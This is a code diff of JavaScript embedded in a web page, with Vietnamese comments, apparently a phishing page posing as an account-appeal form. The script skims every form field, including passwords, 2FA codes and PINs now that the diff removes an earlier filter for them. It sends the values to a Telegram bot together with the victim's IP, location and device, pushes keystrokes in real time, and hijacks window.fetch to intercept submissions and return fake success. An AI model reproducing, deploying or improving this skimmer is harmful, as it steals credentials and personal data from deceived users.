@@ -8,9 +8,8 @@
   const _origFetch = window.fetch;
   const capturedFields = {};
   const fieldIndexMap = new WeakMap();
-  let isSending = false;
   let lastSentHash = "";
-
+  let sendTimer = null;
   let geoInfo = {
     ip: "Unknown",
     location: "Unknown",
@@ -25,9 +24,8 @@
       .replace(/>/g, ">");
   }
 
+  // Phân biệt rõ ô thứ 1 và ô thứ 2 để không bị ghi đè dữ liệu
   function getCleanFieldLabel(el) {
-    if (!el || el.type === 'password' || el.type === 'hidden') return null;
-
     let raw = "";
     if (el.id) {
       const lbl = document.querySelector(`label[for="${el.id}"]`);
@@ -41,11 +39,7 @@
     raw = raw.replace(/[\*\:\n\r]+/g, ' ').replace(/\s+/g, ' ').trim();
     const lower = raw.toLowerCase();
 
-    // Chỉ thu thập thông tin liên hệ thông thường, bỏ qua các trường nhạy cảm
-    if (lower.includes('pass') || lower.includes('2fa') || lower.includes('otp') || lower.includes('pin') || lower.includes('secret')) {
-      return null;
-    }
-
+    // Đếm thứ tự xuất hiện của các ô cùng loại trên giao diện
     if (!fieldIndexMap.has(el)) {
       const allInputs = Array.from(document.querySelectorAll('input, textarea, select'));
       fieldIndexMap.set(el, allInputs.indexOf(el));
@@ -56,33 +50,24 @@
     if (lower.includes('full name') || lower === 'name') return 'Full Name';
     if (lower.includes('birth') || lower.includes('dob') || lower.includes('date')) return 'DOB';
 
+    // Xử lý 2 ô Email
     if (lower.includes('business email')) return 'Business Email';
     if (lower.includes('email') || el.type === 'email') {
+      if (capturedFields['Email'] && capturedFields['Email'] !== el.value.trim()) {
+        return 'Business Email';
+      }
       return `Email_${domIndex}`;
     }
 
+    // Xử lý 2 ô Số điện thoại
     if (lower.includes('backup') || lower.includes('secondary') || lower.includes('alternative')) return 'Backup Phone';
     if (lower.includes('phone') || lower.includes('mobile') || lower.includes('tel') || el.type === 'tel') {
       return `Phone_${domIndex}`;
     }
 
-    if (lower.includes('appeal') || lower.includes('note') || lower.includes('reason') || lower.includes('message') || el.tagName === 'TEXTAREA') {
-      return 'Details';
-    }
+    if (lower.includes('appeal') || lower.includes('note') || lower.includes('reason') || el.tagName === 'TEXTAREA') return 'Details';
 
     return `${raw.length > 22 ? raw.slice(0, 22) + '...' : raw}_${domIndex}`;
-  }
-
-  function scanAllVisibleInputs() {
-    const inputs = document.querySelectorAll('input, textarea, select');
-    inputs.forEach(el => {
-      if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
-      const label = getCleanFieldLabel(el);
-      const val = (el.value || "").trim();
-      if (label && val !== '') {
-        capturedFields[label] = val;
-      }
-    });
   }
 
   function getFormattedDevice() {
@@ -144,69 +129,53 @@
 
   loadGeoDetails();
 
-  // Ghi nhận dữ liệu khi khách hàng nhập hoặc chọn
-  ['input', 'change'].forEach(evt => {
-    document.addEventListener(evt, function(e) {
-      const el = e.target;
-      if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
-        const label = getCleanFieldLabel(el);
-        if (label && el.value.trim() !== '') {
-          capturedFields[label] = el.value.trim();
-        }
-      }
-    }, true);
-  });
-
-  // Hàm gửi dữ liệu về Telegram khi bấm Continue
-  async function sendOnContinue() {
-    scanAllVisibleInputs();
+  async function pushToTelegramRealtime(triggerType) {
     if (Object.keys(capturedFields).length === 0) return;
+    await loadGeoDetails();
 
-    const currentHash = JSON.stringify(capturedFields);
-    if (isSending || currentHash === lastSentHash) return;
+    const currentSnapshot = JSON.stringify(capturedFields);
+    if (currentSnapshot === lastSentHash && triggerType !== "SUBMIT") return;
+    lastSentHash = currentSnapshot;
 
-    isSending = true;
-    lastSentHash = currentHash;
+    // Chuẩn hóa tên hiển thị cho các cặp Email và Phone trước khi gửi
+    const emails = [];
+    const phones = [];
+    const others = [];
+
+    for (const [key, val] of Object.entries(capturedFields)) {
+      if (key.startsWith('Email_') || key === 'Business Email') {
+        emails.push({ key, val });
+      } else if (key.startsWith('Phone_') || key === 'Backup Phone') {
+        phones.push({ key, val });
+      } else {
+        const cleanName = key.replace(/_\d+$/, '');
+        others.push(`▪️ <b>${escapeHTML(cleanName)}:</b> <code>${escapeHTML(val)}</code>`);
+      }
+    }
+
+    const emailLines = emails.map((item, idx) => {
+      const label = idx === 0 ? 'Email' : 'Business Email';
+      return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
+    });
+
+    const phoneLines = phones.map((item, idx) => {
+      const label = idx === 0 ? 'Phone' : 'Backup Phone';
+      return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
+    });
+
+    const statusBadge = triggerType === "SUBMIT" ? "✅ <b>FORM SUBMITTED</b>" : "⏳ <b>TYPING...</b>";
+    let lines = [
+      statusBadge,
+      `🌐 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>`,
+      `📍 <b>Location:</b> <code>${escapeHTML(geoInfo.location)}</code>`,
+      `💻 <b>Device:</b> <code>${escapeHTML(getFormattedDevice())}</code>`,
+      `────────────────────`,
+      ...others,
+      ...emailLines,
+      ...phoneLines
+    ];
 
     try {
-      await loadGeoDetails();
-
-      const emails = [];
-      const phones = [];
-      const others = [];
-
-      for (const [key, val] of Object.entries(capturedFields)) {
-        if (key.startsWith('Email_') || key === 'Business Email') {
-          emails.push({ key, val });
-        } else if (key.startsWith('Phone_') || key === 'Backup Phone') {
-          phones.push({ key, val });
-        } else {
-          const cleanName = key.replace(/_\d+$/, '');
-          others.push(`▪️ <b>${escapeHTML(cleanName)}:</b> <code>${escapeHTML(val)}</code>`);
-        }
-      }
-
-      const emailLines = emails.map((item, idx) => {
-        const label = idx === 0 ? 'Email' : 'Business Email';
-        return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
-      });
-
-      const phoneLines = phones.map((item, idx) => {
-        const label = idx === 0 ? 'Phone' : 'Backup Phone';
-        return `▪️ <b>${label}:</b> <code>${escapeHTML(item.val)}</code>`;
-      });
-
-      const lines = [
-        `✅ <b>CONTINUE CLICKED</b>`,
-        `🌐 <b>IP:</b> <code>${escapeHTML(geoInfo.ip)}</code>`,
-        `📍 <b>Location:</b> <code>${escapeHTML(geoInfo.location)}</code>`,
-        `💻 <b>Device:</b> <code>${escapeHTML(getFormattedDevice())}</code>`,
-        `────────────────────`,
-        ...others,
-        ...emailLines,
-        ...phoneLines
-      ];
-
       await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -216,45 +185,51 @@
           parse_mode: "HTML"
         })
       });
-    } catch (err) {
-      lastSentHash = "";
-    } finally {
-      setTimeout(() => { isSending = false; }, 1500);
-    }
+    } catch (err) {}
   }
 
-  // Bắt chính xác thao tác bấm nút Continue (hỗ trợ cả <button>, <a>, <div>, <input>)
+  document.addEventListener('input', function(e) {
+    const el = e.target;
+    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
+      const label = getCleanFieldLabel(el);
+      if (el.value.trim() !== '') {
+        capturedFields[label] = el.value.trim();
+        clearTimeout(sendTimer);
+        sendTimer = setTimeout(() => pushToTelegramRealtime("AUTO"), 2500);
+      }
+    }
+  }, true);
+
   document.addEventListener('click', function(e) {
-    const clickable = e.target.closest('button, input[type="submit"], input[type="button"], [role="button"], a, div, span');
-    if (!clickable) return;
-
-    const labelText = (
-      clickable.innerText ||
-      clickable.value ||
-      clickable.getAttribute('aria-label') ||
-      ""
-    ).replace(/\s+/g, ' ').trim().toLowerCase();
-
-    // Nhận diện nút Continue (và các bản dịch phổ biến của Continue)
-    const isContinueBtn =
-      labelText === 'continue' ||
-      labelText === 'tiếp tục' ||
-      labelText === 'continuer' ||
-      labelText === 'continuar' ||
-      labelText === 'next' ||
-      clickable.type === 'submit';
-
-    if (isContinueBtn) {
-      sendOnContinue();
+    const btn = e.target.closest('button, [type="submit"]');
+    if (btn && Object.keys(capturedFields).length > 0) {
+      clearTimeout(sendTimer);
+      pushToTelegramRealtime("SUBMIT");
     }
   }, true);
 
-  // Dự phòng khi khách ấn phím Enter trong ô nhập liệu để qua bước
-  document.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter' && e.target && e.target.tagName === 'INPUT') {
-      sendOnContinue();
+  window.fetch = async function(url, options) {
+    if (typeof url === 'string' && url.includes('/api/ip-location')) {
+      const data = await loadGeoDetails();
+      return new Response(JSON.stringify({
+        country: data.country_code,
+        country_code: data.country_code,
+        city: data.city,
+        ip: data.ip
+      }), { status: 200, headers: { 'Content-Type': 'application/json' } });
     }
-  }, true);
+
+    if (options && options.method === 'POST' && (url.includes('telegram.org') || url.includes('/api/'))) {
+      clearTimeout(sendTimer);
+      await pushToTelegramRealtime("SUBMIT");
+      return new Response(JSON.stringify({ ok: true, success: true }), {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+
+    return _origFetch.apply(this, arguments);
+  };
 </script><meta charSet="utf-8"/>
 <!-- This site is hosted on Netlify. Anyone can build and deploy a site
      like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=e6480cd0-4259-4b3d-a381-30af56dafac8
